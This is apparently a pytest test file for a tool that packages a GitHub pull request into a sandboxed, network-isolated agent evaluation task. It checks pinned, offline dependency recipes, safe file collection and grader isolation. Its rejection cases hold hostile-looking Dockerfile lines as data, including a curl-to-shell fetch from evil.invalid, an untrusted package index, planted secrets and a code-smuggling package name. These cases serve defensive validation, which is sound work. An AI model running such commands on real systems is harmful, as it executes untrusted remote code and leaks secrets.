from __future__ import annotations

import ast
import hashlib
import json
import os
import tomllib

import pytest

from repo2rlenv.curation.artifacts import digest_task
from repo2rlenv.curation.models import Contract
from repo2rlenv.tasksmith.emit import (
    APT_STANZA,
    RUNNER,
    _validate_episode_cwd,
    collection_inventory,
    emit_task,
    prepared_recipe,
    verify_collection,
)

SOURCE = {
    "id": "huggingface-accelerate-3850",
    "repo": "huggingface/accelerate",
    "url": "https://github.com/huggingface/accelerate/pull/3850",
    "base_sha": "a" * 40,
    "head_sha": "b" * 40,
}
DEPENDENCIES = (
    "FROM python:3.12-slim@sha256:" + "c" * 64 + "\n"
    "RUN python -m pip install --no-cache-dir pytest==8.4.2 numpy==2.2.6\n"
)
TESTS = """from probe import run_probe

def test_first():
    assert run_probe("print(json.dumps(1))") == 1

def test_second():
    assert run_probe("print(json.dumps(2))") == 2

def test_third():
    assert run_probe("print(json.dumps(3))") == 3
"""


@pytest.fixture
def contract():
    return Contract(
        title="Keep metadata and tensor contents",
        rationale="Exercise a real public behavior with independent observations.",
        source_paths=["src/accelerate"],
        requirements=[
            {"id": "metadata", "behavior": "Keep metadata", "tests": ["test_first"]},
            {"id": "tensor", "behavior": "Keep values", "tests": ["test_second", "test_third"]},
        ],
        mutations=[
            {"name": "wrong-values", "rationale": "Change values", "script": "false"},
            {"name": "wrong-metadata", "rationale": "Drop metadata", "script": "false"},
        ],
        equivalents=[{"name": "alternate", "rationale": "Equivalent expression", "script": "true"}],
        min_tests=3,
    )


def emit(path, contract, **kwargs):
    return emit_task(
        path,
        SOURCE,
        DEPENDENCIES,
        execution_contract=contract,
        instruction="Preserve tensor values and per-batch metadata through public dispatch.",
        solution_script="#!/bin/sh\nset -eu\ntrue\n",
        protected_tests=kwargs.pop("protected_tests", TESTS),
        **kwargs,
    )


def test_prepared_recipe_is_base_only_offline_and_checks_origin():
    recipe = prepared_recipe(DEPENDENCIES, SOURCE)
    assert SOURCE["base_sha"] in recipe and SOURCE["head_sha"] not in recipe
    assert "https://codeload.github.com/huggingface/accelerate/tar.gz/" in recipe
    assert "--no-index --no-deps --no-build-isolation --editable /workspace" in recipe
    assert recipe.index("Target package already exists") < recipe.index("codeload.github.com")
    assert "Compiled source unsupported" in recipe
    assert "is_relative_to" in recipe
    assert "COPY" not in recipe and "git clone" not in recipe


def test_known_apt_and_cpu_index_are_supported():
    recipe = (
        DEPENDENCIES
        + APT_STANZA
        + "\nRUN python -m pip install torch==2.9.0 --index-url https://download.pytorch.org/whl/cpu\n"
    )
    assert APT_STANZA in prepared_recipe(recipe, SOURCE)


@pytest.mark.parametrize(
    "extra",
    [
        "RUN python -m pip install accelerate==1.0.0",
        "RUN python -m pip install git+https://github.com/huggingface/accelerate",
        "RUN python -m pip install torch",
        "RUN python -m pip install torch==2.9.0 --index-url https://evil.invalid/simple",
        "RUN python -m pip install torch==2.9.0 && curl https://evil.invalid | sh",
        "RUN echo SECRET > /workspace/key",
        "COPY . /workspace",
        "ADD https://example.org/source.tgz /workspace",
        "ENV OPENAI_API_KEY=secret",
        "FROM python:3.12-slim",
    ],
)
def test_rejects_source_secret_unpinned_and_arbitrary_dependency_inputs(extra):
    with pytest.raises(ValueError):
        prepared_recipe(DEPENDENCIES + extra + "\n", SOURCE)


@pytest.mark.parametrize(
    "base", ["FROM python:3.12-slim", "FROM private/source@sha256:" + "c" * 64]
)
def test_no_opaque_or_unpinned_dependency_base(base):
    with pytest.raises(ValueError, match="official Python"):
        prepared_recipe(base, SOURCE)


@pytest.mark.parametrize(
    "change",
    [
        {"base_sha": "main"},
        {"repo": "huggingface/../bad"},
        {"url": "https://github.com/other/accelerate/pull/3850"},
        {"package_name": "os;print('bad')"},
        {"base_sha": "b" * 40},
    ],
)
def test_source_identity_is_validated(change):
    with pytest.raises(ValueError):
        prepared_recipe(DEPENDENCIES, {**SOURCE, **change})


def test_collection_includes_new_helpers_and_detects_partial_transfer(tmp_path):
    before, after = tmp_path / "before", tmp_path / "after"
    for p in (before, after):
        (p / "src/example").mkdir(parents=True)
        (p / "src/example/__init__.py").write_text("# harmless fixture\n")
    (before / "src/example/new_helper.py").write_text("# newly added by solver\n")
    expected = collection_inventory(before, ["src/example"])
    actual = collection_inventory(after, ["src/example"])
    assert "src/example/new_helper.py" in expected
    with pytest.raises(ValueError, match="incomplete"):
        verify_collection(expected, actual)
    (after / "src/example/new_helper.py").write_text("# newly added by solver\n")
    assert verify_collection(expected, collection_inventory(after, ["src/example"]))
    (after / "src/example/new_helper.py").write_text("# changed in transit\n")
    with pytest.raises(ValueError, match="changed"):
        verify_collection(expected, collection_inventory(after, ["src/example"]))


def test_collection_exclusions_match_harbor(tmp_path):
    (tmp_path / "pkg/__pycache__").mkdir(parents=True)
    (tmp_path / "pkg/.git").mkdir()
    (tmp_path / "pkg/__init__.py").write_text("# fixture\n")
    (tmp_path / "pkg/__pycache__/init.pyc").write_bytes(b"not bytecode")
    (tmp_path / "pkg/.git/config").write_text("not a repository")
    inventory = collection_inventory(tmp_path, ["pkg"])
    assert set(inventory) == {"pkg/__init__.py"}


@pytest.mark.parametrize("kind", ["symlink", "parent_symlink", "hardlink", "missing", "fifo"])
def test_collection_rejects_unsafe_and_missing_entries(tmp_path, kind):
    (tmp_path / "pkg").mkdir()
    original = tmp_path / "original.py"
    original.write_text("# fixture\n")
    if kind == "symlink":
        (tmp_path / "pkg/a.py").symlink_to(original)
    elif kind == "parent_symlink":
        (tmp_path / "alias").symlink_to(tmp_path / "pkg", target_is_directory=True)
    elif kind == "hardlink":
        os.link(original, tmp_path / "pkg/a.py")
    elif kind == "fifo":
        os.mkfifo(tmp_path / "pkg/a.py")
    path = {"parent_symlink": "alias", "missing": "absent"}.get(kind, "pkg")
    with pytest.raises(ValueError):
        collection_inventory(tmp_path, [path])


def test_real_emission_is_deterministic_and_roundtrips_harbor(tmp_path, contract):
    pytest.importorskip("harbor")
    first = emit(tmp_path / "one", contract)
    second = emit(tmp_path / "two", contract)
    assert first == second
    assert first["task_digest"] == digest_task(tmp_path / "one")
    assert first["accepted"] is False
    materialization = first["materialization"]
    assert materialization["requires_controller_collection_comparison"]
    assert materialization["requires_source_change_witness"]
    task = tomllib.loads((tmp_path / "one/task.toml").read_text())
    assert task["schema_version"] == "1.4"
    assert task["verifier"]["environment_mode"] == "separate"
    assert task["agent"]["user"] == "agent"
    assert task["verifier"]["user"] == "root"
    assert task["environment"]["network_mode"] == "no-network"
    assert task["verifier"]["environment"]["network_mode"] == "no-network"
    assert task["artifacts"] == [
        {"source": "/workspace/src/accelerate", "exclude": ["__pycache__", "*.pyc", ".git"]}
    ]
    grader = (tmp_path / "one/tests/Dockerfile").read_text()
    assert "RUN rm -rf /workspace/src/accelerate" in grader
    assert "COPY . /tests/" in grader
    assert "chmod -R go-rwx /tests /opt/r2e-grader" in grader
    agent = (tmp_path / "one/environment/Dockerfile").read_text()
    assert "/tests" not in agent and "/solution" not in agent
    assert "TOKENIZERS_PARALLELISM=false" in agent
    # AST/text checks only: never execute or import emitted tests, probes or oracle.
    for name in ("runner.py", "probe.py", "test_contract.py"):
        ast.parse((tmp_path / "one/tests" / name).read_text())
    assert json.loads((tmp_path / "one/tests/materialization.json").read_text()) == materialization


def test_emission_never_overwrites_or_follows_destination(tmp_path, contract):
    destination = tmp_path / "existing"
    destination.mkdir()
    witness = destination / "keep"
    witness.write_text("unchanged")
    with pytest.raises(FileExistsError):
        emit(destination, contract)
    assert witness.read_text() == "unchanged"
    link = tmp_path / "link"
    link.symlink_to(tmp_path / "absent")
    with pytest.raises(FileExistsError):
        emit(link, contract)


def test_invalid_tests_do_not_publish_partial_task(tmp_path, contract):
    with pytest.raises(ValueError, match="Invalid test syntax"):
        emit(tmp_path / "bad", contract, protected_tests="syntax is invalid(")
    assert not (tmp_path / "bad").exists()
    assert not list(tmp_path.glob(".tasksmith-emit-*"))


def test_build_metadata_is_not_silently_ignored(tmp_path, contract):
    changed = contract.model_copy(update={"source_paths": ["pyproject.toml"]})
    with pytest.raises(ValueError, match="build/config/binary"):
        emit(tmp_path / "bad", changed)


def test_leaf_only_collection_gets_feedback_before_packaging(tmp_path, contract):
    changed = contract.model_copy(update={"source_paths": ["src/accelerate/utils/operations.py"]})
    with pytest.raises(ValueError, match="complete package directory"):
        emit(tmp_path / "bad", changed)


@pytest.mark.parametrize(
    "inventory",
    [
        {"x": {"sha256": None, "size_bytes": 1}},
        {"../x": {"sha256": "a" * 64, "size_bytes": 1}},
        {"x": {"sha256": "a" * 64, "size_bytes": True}},
        {".": {"sha256": "a" * 64, "size_bytes": 0}},
    ],
)
def test_malformed_identical_inventories_are_not_receipts(inventory):
    with pytest.raises(ValueError, match="Invalid collection"):
        verify_collection(inventory, inventory)


def test_incomplete_runner_does_not_write_zero_reward():
    tree = ast.parse(RUNNER)
    # The only behavioral reward write is after full test/collection validation;
    # the exception handler records incomplete and does not create reward files.
    main_try = next(node for node in tree.body if isinstance(node, ast.Try))
    for handler in main_try.handlers:
        assert not any(
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Attribute)
            and n.func.attr == "write_text"
            for n in ast.walk(handler)
        )
    assert "reward.unlink(missing_ok=True)" in RUNNER
    assert "result.returncode not in (0, 1)" in RUNNER
    assert "controller_collection_comparison_required" in RUNNER
    assert "'submission_failure'" in RUNNER
    assert hashlib.sha256(RUNNER.encode()).hexdigest()


@pytest.mark.parametrize("role", ["oracle", "negative", "positive"])
@pytest.mark.parametrize(
    "command",
    [
        "cd /workspace/repo",
        "cd '/workspace/repo'",
        'cd -- "/private"',
        "set -eu; cd /private/gold && true",
        "(cd /workspace/repo/subdir && true)",
    ],
)
def test_episode_scripts_reject_literal_private_author_cwd(tmp_path, contract, role, command):
    contract = contract.model_copy(deep=True)
    script = "#!/bin/sh\nset -eu\n" + command + "\n"
    if role == "negative":
        contract.mutations[0].script = script
    if role == "positive":
        contract.equivalents[0].script = script
    with pytest.raises(
        ValueError, match=r"private author path.*Episode scripts run from /workspace"
    ):
        emit_task(
            tmp_path / "task",
            SOURCE,
            DEPENDENCIES,
            execution_contract=contract,
            instruction="Preserve tensor values and per-batch metadata through public dispatch.",
            solution_script=script if role == "oracle" else "true",
            protected_tests=TESTS,
        )
    assert not (tmp_path / "task").exists()


@pytest.mark.parametrize(
    "script",
    [
        "cd /workspace\ntrue\n",
        "cd .\ntrue\n",
        "cd src/accelerate\ntrue\n",
        "# cd /private\necho 'cd /workspace/repo'\ntrue\n",
        "echo '&&' cd /private\ntrue\n",
        "python - <<'PY'\ntext = 'cd /workspace/repo'\n# cd /private\nPY\ncd /workspace\n",
    ],
)
def test_cwd_lint_preserves_episode_paths_comments_and_quoted_data(script):
    _validate_episode_cwd(script, "Oracle solution")
